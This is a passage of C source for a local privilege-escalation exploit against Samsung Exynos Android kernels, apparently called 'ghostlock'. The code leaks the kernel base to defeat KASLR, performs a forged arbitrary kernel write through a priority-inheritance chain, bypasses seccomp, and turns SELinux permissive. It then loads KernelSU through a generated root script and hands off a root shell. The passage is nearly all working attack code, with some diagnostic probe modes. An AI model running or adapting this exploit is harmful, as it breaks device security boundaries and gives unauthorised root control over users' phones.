  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0) drain[n++] = pid;
      else break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(20000);
  }
}

static int run_controlled_pi_chain_check(void) {
  atomic_store(&controlled_pi_owner_nice_applied, 0);
  atomic_store(&controlled_pi_probe_active, 1);
  slab_drain();
  int routed = do_one_write(0, "Exynos controlled PI chain check",
                            RTSIG_CONTROLLED_PI_PROBE_MODE, 1);
  atomic_store(&controlled_pi_probe_active, 0);
  int owner_nice_applied = atomic_load(&controlled_pi_owner_nice_applied);
  pr_info("controlled PI chain routed=%d waiter_reprio=%d\n",
          routed, last_route_probe_page_touched);
  pr_info("controlled PI chain owner_nice19=%d\n", owner_nice_applied);
  if (!routed || !owner_nice_applied || !last_route_probe_page_touched) {
    pr_error("controlled PI chain did not complete\n");
    return 0;
  }
  pr_success("controlled PI chain completed; no external kernel address was targeted\n");
  return 1;
}

static int tracefs_tracing_on_read(void) {
  const char *roots[] = { "/sys/kernel/tracing", "/sys/kernel/debug/tracing" };
  char path[160];
  for (size_t i = 0; i < sizeof(roots) / sizeof(roots[0]); i++) {
    snprintf(path, sizeof(path), "%s/tracing_on", roots[i]);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) continue;
    char value = 0;
    ssize_t n = read(fd, &value, 1);
    close(fd);
    if (n == 1 && (value == '0' || value == '1')) return value - '0';
  }
  return -1;
}

static int tracefs_tracing_on_write(int enabled) {
  const char *roots[] = { "/sys/kernel/tracing", "/sys/kernel/debug/tracing" };
  char path[160];
  char value = enabled ? '1' : '0';
  for (size_t i = 0; i < sizeof(roots) / sizeof(roots[0]); i++) {
    snprintf(path, sizeof(path), "%s/tracing_on", roots[i]);
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) continue;
    ssize_t n = write(fd, &value, 1);
    int saved_errno = errno;
    close(fd);
    errno = saved_errno;
    if (n == 1) return 1;
  }
  return 0;
}

static int tracefs_clock_read(char *selected, size_t selected_size) {
  const char *roots[] = { "/sys/kernel/tracing", "/sys/kernel/debug/tracing" };
  char path[160];
  char value[256];
  if (!selected || selected_size < 2) return 0;
  for (size_t i = 0; i < sizeof(roots) / sizeof(roots[0]); i++) {
    snprintf(path, sizeof(path), "%s/trace_clock", roots[i]);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) continue;
    ssize_t n = read(fd, value, sizeof(value) - 1);
    close(fd);
    if (n <= 0) continue;
    value[n] = '\0';
    char *begin = strchr(value, '[');
    char *end = begin ? strchr(begin + 1, ']') : NULL;
    if (!begin || !end || end == begin + 1) continue;
    size_t len = (size_t)(end - begin - 1);
    if (len >= selected_size) len = selected_size - 1;
    memcpy(selected, begin + 1, len);
    selected[len] = '\0';
    return 1;
  }
  return 0;
}

static int tracefs_clock_write(const char *clock_name) {
  const char *roots[] = { "/sys/kernel/tracing", "/sys/kernel/debug/tracing" };
  char path[160];
  size_t len = clock_name ? strlen(clock_name) : 0;
  if (!len) return 0;
  for (size_t i = 0; i < sizeof(roots) / sizeof(roots[0]); i++) {
    snprintf(path, sizeof(path), "%s/trace_clock", roots[i]);
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) continue;
    ssize_t n = write(fd, clock_name, len);
    int saved_errno = errno;
    close(fd);
    errno = saved_errno;
    if (n == (ssize_t)len) return 1;
  }
  return 0;
}

static int run_route_write_probe(void) {
  if (!active_offsets->off_global_trace ||
      active_offsets->trace_control_word != 0x50) {
    pr_error("route-probe is not calibrated for this profile\n");
    return 0;
  }

  int saved_tracing = tracefs_tracing_on_read();
  char saved_clock[32] = {0};
  char primed_clock[32] = {0};
  char observed_clock[32] = {0};
  char restored_clock[32] = {0};
  /* The forged-tree leaf writes eight zero bytes.  With tracing stopped,
   * prime global_trace.clock_id to the nonzero "global" clock through the
   * supported tracefs control.  Zeroing the word at stop_count changes the
   * adjacent clock_id back to local, which trace_clock exposes directly. */
  if (saved_tracing < 0 || !tracefs_tracing_on_write(0) ||
      tracefs_tracing_on_read() != 0) {
    pr_error("route-probe cannot establish tracing_off baseline errno=%d\n",
             errno);
    return 0;
  }
  if (!tracefs_clock_read(saved_clock, sizeof(saved_clock)) ||
      !tracefs_clock_write("global") ||
      !tracefs_clock_read(primed_clock, sizeof(primed_clock)) ||
      strcmp(primed_clock, "global") != 0) {
    pr_error("route-probe cannot prime trace_clock=global errno=%d\n", errno);
    if (saved_clock[0]) tracefs_clock_write(saved_clock);
    tracefs_tracing_on_write(saved_tracing);
    return 0;
  }

  uintptr_t control_word = text_addr(
      KIMAGE_TEXT_BASE + active_offsets->off_global_trace) +
      active_offsets->trace_control_word;
  pr_info("route-probe target=%016zx (global_trace stop_count/clock_id word)\n",
          control_word);
  slab_drain();
  /* prepare_skb_payload stores target-8 as the fake rb parent.  The right
   * child slot is therefore the caller's exact target. */
  int routed = do_one_write(control_word, "Exynos route probe", 1, 1);
  int observed_ok = tracefs_clock_read(observed_clock, sizeof(observed_clock));

  /* Always restore both trace controls through their supported interfaces,
   * including when the forged write misses. */
  int restored = tracefs_clock_write(saved_clock) &&
                 tracefs_clock_read(restored_clock, sizeof(restored_clock)) &&
                 strcmp(restored_clock, saved_clock) == 0 &&
                 tracefs_tracing_on_write(saved_tracing) &&
                 tracefs_tracing_on_read() == saved_tracing;
  pr_info("route-probe routed=%d clock=%s saved=%s restored=%d\n",
          routed, observed_ok ? observed_clock : "unreadable", saved_clock,
          restored);
  if (!restored) {
    pr_error("route-probe could not restore trace_clock=%s tracing_on=%d\n",
             saved_clock, saved_tracing);
    return 0;
  }
  if (!observed_ok || strcmp(observed_clock, "local") != 0) {
    pr_warning("route-probe miss: PI consumer did not execute the leaf write\n");
    return 0;
  }
  pr_success("route-probe verified the Exynos PI arbitrary write\n");
  return 1;
}

static int run_carrier_window_check(void) {
  if (!active_offsets || !active_offsets->rt_sigreturn_route) {
    pr_error("carrier-window-check is only available for the G985F route\n");
    return 0;
  }
  clear_pselect_write();
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) {
    pr_warning("carrier-window-check failed during heap preparation\n");
    return 0;
  }
  atomic_store_explicit(&route_carrier_diagnostic_only, 1,
                        memory_order_release);
  int observed = run_main_route_threads();
  atomic_store_explicit(&route_carrier_diagnostic_only, 0,
                        memory_order_release);
  if (observed)
    pr_success("carrier-window-check complete; no PI scheduler call or write attempted\n");
  else
    pr_warning("carrier-window-check did not reach the post-copy window\n");
  return observed;
}

static char g_home_dir[256] = "/data/local/tmp";
static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";

#define DEFAULT_LOCAL_ROOT_HELPER_PATH "/data/local/tmp/ghostlock-helper"
#define LOCAL_ROOT_SOCKET "/data/local/tmp/temp_su.sock"

const char *ghostlock_root_script_path(void) { return g_root_script_path; }

static const char *local_root_helper_path(void) {
  const char *from_app = getenv("GHOSTLOCK_HELPER_PATH");
  if (from_app && from_app[0] && access(from_app, X_OK) == 0) {
    return from_app;
  }
  if (access(DEFAULT_LOCAL_ROOT_HELPER_PATH, X_OK) == 0) {
    return DEFAULT_LOCAL_ROOT_HELPER_PATH;
  }
  if (from_app && from_app[0]) {
    return from_app;
  }
  return DEFAULT_LOCAL_ROOT_HELPER_PATH;
}

static void init_runtime_paths(void) {
  const char *home = getenv("GHOSTLOCK_HOME");
  if (!home || !home[0]) home = getenv("TMPDIR");
  if (!home || !home[0]) home = "/data/local/tmp";

  snprintf(g_home_dir, sizeof(g_home_dir), "%s", home);
  size_t n = strlen(g_home_dir);
  while (n > 1 && g_home_dir[n - 1] == '/') {
    g_home_dir[--n] = '\0';
  }
  snprintf(g_root_script_path, sizeof(g_root_script_path),
           "%s/.ghostlock_root.sh", g_home_dir);
  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
}

static void write_root_script(void) {
  char script[4096];
  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_warning("open root script failed path=%s errno=%d\n",
               g_root_script_path, errno);
    return;
  }

  int n = snprintf(
      script, sizeof(script),
      "#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
      "LOADER=\"/data/local/tmp/lkmloader.ko\"\n"
      "MODULE=\"/data/local/tmp/kernelsu.ko\"\n"
      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
      "echo \"[*] selinux_context=$(cat /proc/self/attr/current 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] direct loader=$LOADER module=$MODULE\" >>\"$LOG\"\n"
      "echo \"[*] direct loader_file=$(ls -l \"$LOADER\" 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] direct module_file=$(ls -l \"$MODULE\" 2>/dev/null)\" >>\"$LOG\"\n"
      "if [ ! -r \"$LOADER\" ] || [ ! -r \"$MODULE\" ]; then\n"
      "  echo '[!] direct loader or kernelsu module missing' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "if ! cd /data/local/tmp; then\n"
      "  echo '[!] direct loader chdir failed' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "echo \"[*] direct insmod begin cwd=$(pwd)\" >>\"$LOG\"\n"
      "/system/bin/insmod lkmloader.ko module_path=kernelsu.ko >>\"$LOG\" 2>&1\n"
      "INSMOD_RC=$?\n"
      "echo \"[*] direct insmod exit=$INSMOD_RC\" >>\"$LOG\"\n"
      "if [ \"$INSMOD_RC\" -ne 0 ]; then\n"
      "  echo '[!] direct lkmloader insmod failed' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  echo '[!] KernelSU module not visible after direct insmod' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
      "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "POLICY=/sys/fs/selinux/policy\n"
      "for i in $(seq 1 50); do [ -s \"$POLICY\" ] && break; sleep 0.1; done\n"
      "load_policy \"$POLICY\" >>\"$LOG\" 2>&1\n"
      "RC=$?\n"
      "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "echo \"[*] policy fixup rc=$RC\" >>\"$LOG\"\n"
      "echo '[!] Reconnect Wi-Fi or mobile data if network is unavailable' | tee -a \"$LOG\"\n",
      g_home_dir);
  if (n < 0 || n >= (int)sizeof(script)) {
    pr_warning("root script too long\n");
    close(sfd);
    return;
  }
  if (write(sfd, script, (size_t)n) != n) {
    pr_warning("write root script failed errno=%d\n", errno);
  }
  close(sfd);
  chmod(g_root_script_path, 0755);
}

static int kernelsu_module_loaded(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules) return 0;

  char line[256];
  int loaded = 0;
  while (fgets(line, sizeof(line), modules)) {
    char name[64];
    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
      loaded = 1;
      break;
    }
  }
  fclose(modules);
  return loaded;
}

/* The external late-load helper cannot be used as a standalone client: its
 * --late-load mode verifies a ticket/payload environment first.  Ghostlock
 * keeps only the root UMH daemon and local Unix-socket boundary, with both
 * ends implemented locally. */
static int run_local_late_load(int keep_daemon) {
  const char *helper_path = local_root_helper_path();
  pid_t child = fork();
  if (child < 0) {
    pr_warning("local late-load client fork failed errno=%d\n", errno);
    return 0;
  }
  if (child == 0) {
    prctl(PR_SET_NAME, "ghostlock-ksu-client");
    execl(helper_path, "ghostlock-helper",
          keep_daemon ? "--late-load-keep" : "--late-load", NULL);
    _exit(127);
  }

  int status = 0;
  int waited_ms = 0;
  for (;;) {
    pid_t waited = waitpid(child, &status, WNOHANG);
    if (waited == child) break;
    if (waited < 0) {
      pr_warning("local late-load client wait failed errno=%d\n", errno);
      return 0;
    }
    if (waited_ms >= 60000) {
      pr_warning("local late-load client timed out; killing pid=%d\n", child);
      kill(child, SIGKILL);
      waitpid(child, &status, 0);
      return 0;
    }
    usleep(100000);
    waited_ms += 100;
  }

  if (WIFEXITED(status)) {
    int rc = WEXITSTATUS(status);
    pr_info("local late-load client exit=%d\n", rc);
    return rc == 0;
  }
  if (WIFSIGNALED(status)) {
    pr_warning("local late-load client signal=%d\n", WTERMSIG(status));
  }
  return 0;
}

/* The UMH daemon already owns uid 0 and exposes the authenticated shell
 * service on temp_su.sock. Keep the console path independent from KernelSU:
 * exec the existing helper client with no command so its daemon-side default
 * is /system/bin/sh. This keeps adb's standard descriptors attached to the
 * resulting root shell. */
static int handoff_root_shell(void) {
  const char *helper_path = local_root_helper_path();
  pr_info("root shell handoff helper=%s\n", helper_path);
  fflush(stdout);
  fflush(stderr);
  execl(helper_path, "ghostlock-helper", (char *)NULL);
  int saved_errno = errno;
  pr_warning("root shell helper exec failed errno=%d\n", saved_errno);
  return 127;
}

static int root_shell_requested(int argc, char **argv) {
  if (argc >= 2 && argv && strcmp(argv[1], "--root-shell") == 0) {
    return 1;
  }
  const char *env = getenv("GHOSTLOCK_ROOT_SHELL");
  return env && env[0] && strcmp(env, "0") != 0;
}

/* Find a task through perf sample records. */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

/* W3a: catch the filter's SIGSYS so a missed write costs a retry, not the
 * child. */
static volatile sig_atomic_t g_sigsys_hit;
static void sigsys_probe_handler(int sig, siginfo_t *info, void *uctx) {
  (void)sig; (void)info; (void)uctx;
  g_sigsys_hit = 1;
}

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  setpgid(0, 0);  /* own group so the parent can kill the whole late-load
                   * tree (sh + ksud) on timeout */
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* ksud-spawned daemons must not
                                          * inherit the report pipe */
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  /* W3a probe: don't let the filter's SIGSYS kill us. */
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigsys_probe_handler;
  sa.sa_flags = SA_SIGINFO;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGSYS, &sa, NULL);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'F') {
      /* Forked finit_module probe after W3b zeroed seccomp.mode: mode==2
       * re-arms TIF_SECCOMP on fork (probe hits the filter); mode==0 lets it
       * run filter-free to a normal errno. Forked so SIGSYS costs only this. */
      uint32_t code = 0xffffffff;
      int probe_pipe[2];
      if (pipe(probe_pipe) == 0) {
        pid_t probe = fork();
        if (probe == 0) {
          close(probe_pipe[0]);
          /* Forked probe: keep default SIGSYS so the filter kills it. */
          signal(SIGSYS, SIG_DFL);
          errno = 0;
          long r = syscall(__NR_finit_module, 0, 0, 0);
          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
          (void)nw;
          _exit(0);
        }
        close(probe_pipe[1]);
        int st = 0;
        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
          if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
        } else {
          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
        }
        close(probe_pipe[0]);
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'D') {
      /* W3a direct probe (a fork would re-inherit the filter): SIGSYS caught
       * -> filter active; normal errno -> TIF_SECCOMP cleared. */
      uint32_t code = 0xffffffff;
      g_sigsys_hit = 0;
      errno = 0;
      long r = syscall(__NR_finit_module, 0, 0, 0);
      if (g_sigsys_hit) {
        code = 0xfffffffd;
      } else {
        code = (r == 0) ? 0 : (uint32_t)errno;
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'M') {
      /* Report comm length + first byte to tell which side a leaf=1 write
       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
       * [target+8] len 8, untouched len 15. */
      char comm[24] = {0};
      FILE *cf = fopen("/proc/self/comm", "r");
      if (cf) {
        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
        (void)n;
        fclose(cf);
      }
      size_t len = strlen(comm);
      while (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = 0;
        len--;
      }
      uint32_t report =
        ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
      write(p->uid_w, &report, sizeof(report));
    }
    else if (cmd == 'G' || cmd == 'X') break;
  }
  close(p->cmd_r);
  if (getuid() != 0) { close(p->uid_w); _exit(1); }
  /* Keep the app-side pipe/exit fds out of the late-load worker chain: a
   * lingering holder (ksud/zygisk daemons) would keep the app's read and
   * waitFor blocked after this process exits. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  pid_t worker = fork();
  if (worker == 0) {
    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
    _exit(1);
  }
  int wst = -1;
  if (worker > 0) waitpid(worker, &wst, 0);
  /* Report whether the script reached the loaded-module line: only this root
   * child can read the root-owned log, and the parent loses /proc/modules
   * once enforcing is restored. */
  uint32_t report = 0;
  char ksu_log_path[320];
  snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
  FILE *lf = fopen(ksu_log_path, "r");
  if (lf) {
    char line[256];
    while (fgets(line, sizeof(line), lf)) {
      if (strstr(line, "[+] KernelSU module loaded")) report = 1;
    }
    fclose(lf);
  }
  ssize_t nw = write(p->uid_w, &report, sizeof(report));
  (void)nw;
  close(p->uid_w);
  _exit(0);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

static int retry_write_stage(
    const char *stage, uintptr_t target, int mode, int attempts,
    useconds_t settle_usec, write_stage_verify_fn verify, void *context,
    int leaf) {
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
    if (attempt == 1) slab_drain();
    int routed = do_one_write(target, stage, mode, leaf);
    if (!routed) {
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(100000);
      continue;
    }
    if (settle_usec) usleep(settle_usec);
    if (verify(context)) return 1;
    usleep(50000);
  }
  return 0;
}

static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off()) return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

struct w2_stage_context {
  struct child_pipes *pipes;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;

  uint32_t child_uid = 9999;
  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
      (ssize_t)sizeof(child_uid)) {
    return 0;
  }
  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0) return 0;
  pr_success("child is root!\n");
  return 1;
}

static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

static int verify_w3a_direct_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "D", 1) != 1) return 0;

  uint32_t code = 0xffffffff;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    pr_warning("W3a direct probe: no reply (child lost)\n");
    return 0;
  }
  pr_info("W3a direct finit_module probe = 0x%x\n", code);
  /* A normal errno means TIF_SECCOMP is clear. SIGSYS (0xfffffffd) means the
   * filter still caught the probe (child survives via its handler);
   * EPERM/ENOSYS count as failure because zeroing mode with TIF_SECCOMP set
   * would BUG(). */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("W3a direct probe: filter bypassed in child (errno=%u)\n", code);
  return 1;
}

static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

int run_exploit(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  init_runtime_paths();

  if (!active_offsets && select_offsets() < 0) return 1;

  int trace_check = argc == 2 && strcmp(argv[1], "--trace-check") == 0;
  int sigreturn_check = argc == 2 && strcmp(argv[1], "--sigreturn-check") == 0;
  int sigreturn_fault_check =
      argc == 2 && strcmp(argv[1], "--sigreturn-fault-check") == 0;
  int heap_check = argc == 2 && strcmp(argv[1], "--heap-check") == 0;
  int route_probe = argc == 2 && strcmp(argv[1], "--route-probe") == 0;
  int pi_chain_check =
      argc == 2 && strcmp(argv[1], "--pi-chain-check") == 0;
  int carrier_window_check =
      argc == 2 && strcmp(argv[1], "--carrier-window-check") == 0;
  if (active_offsets->diagnostic_only && !trace_check && !sigreturn_check &&
      !sigreturn_fault_check && !heap_check &&
      !pi_chain_check && !carrier_window_check) {
    pr_warning("G985F profile is diagnostic-only; route-write probes are disabled until exact stack reuse is validated\n");
    return 3;
  }

  log_startup_context();
  if (sigreturn_check) {
    return rt_sigreturn_route_selftest() ? 0 : 1;
  }
  if (sigreturn_fault_check) {
    return rt_sigreturn_fault_selftest() ? 0 : 1;
  }
  if (!active_offsets->diagnostic_only) init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  /* This diagnostic only exercises the bounded signal carrier and stops
   * before sched_setattr().  It has no kernel-address target, so do not run
   * tracefs sampling (which consumes trace records) just to invoke it. */
  if (carrier_window_check) {
    timer_reset();
    TIMER("carrier-window-check start (tracefs untouched)");
    pr_info("carrier-window-check skips KASLR sampling; no kernel target is used\n");
    return run_carrier_window_check() ? 0 : 1;
  }
  if (active_offsets->tracefs_leak && !pi_chain_check) {
    /* The calibrated Fold6 bootloader uses equal physical/virtual slides.
     * Legacy Exynos 4.19 virtual KASLR does not establish a physical slide.
     * Discover the virtual base before any write:
     * with a wrong slide every physmap-derived target is off by up to
     * 0x1f0000 and the write corrupts random kernel memory. */
    uint64_t leaked_base = 0;
    if (!tracefs_leak_kernel_base(&leaked_base)) {
      pr_error("tracefs slide leak failed; aborting instead of writing "
               "with a guessed slide\n");
      return 1;
    }
    kaslr_base = leaked_base;
    kaslr_slide = leaked_base - KIMAGE_TEXT_BASE;
    if (!active_offsets->kaslr_virtual_only) p0_kernel_phys_load += kaslr_slide;
    pr_success("tracefs leak base=%016llx slide=%016llx\n",
               (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
    if (!active_offsets->diagnostic_only)
      pr_info("phys_load=%016llx\n", (unsigned long long)p0_kernel_phys_load);
  }

  /* No-exploit-write preflight for a newly ported Samsung build. It validates the
   * exact uname entry and tracefs KASLR calibration, then exits before the
   * allocator or arbitrary-write stages are entered. */
  if (trace_check) {
    if (active_offsets->diagnostic_only)
      pr_warning("diagnostics do not validate physical addresses or arm the G985F root route\n");
    pr_success("trace-check complete; no exploit write attempted\n");
    return 0;
  }

  if (heap_check) {
    timer_reset();
    TIMER("heap-check start");
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base) {
      pr_warning("heap-check failed before the PI route\n");
      return 1;
    }
    pr_success("heap-check leaked mm_struct=%016zx page=%016zx; "
               "no PI route or arbitrary write attempted\n",
               (size_t)last_mm_struct, (size_t)page_base);
    return 0;
  }

  if (route_probe) {
    timer_reset();
    TIMER("route-probe start");
    return run_route_write_probe() ? 0 : 1;
  }

  if (pi_chain_check) {
    pr_warning("controlled-page PI check skips KASLR sampling; no image or physical target is used\n");
    timer_reset();
    TIMER("controlled PI chain check start");
    return run_controlled_pi_chain_check() ? 0 : 1;
  }

  if (kernelsu_module_loaded()) {
    pr_warning("KernelSU is already loaded; refusing to run the exploit again\n");
    return 2;
  }

  timer_reset();
  TIMER("exploit start");

  /* W1: disable SELinux before task discovery. untrusted_app may not be able
   * to read enforce while it is still enforcing, so attempt W1 regardless.
   * UMH-root devices write permissive inside the UMH staging instead, right
   * before queueing the work item (shortest permissive window,
   * no separate W1 route cycle). */
  int selinux_ok = check_selinux_off();
  if (active_offsets->umh_root) {
    pr_info("UMH device: SELinux permissive deferred to the UMH stage\n");
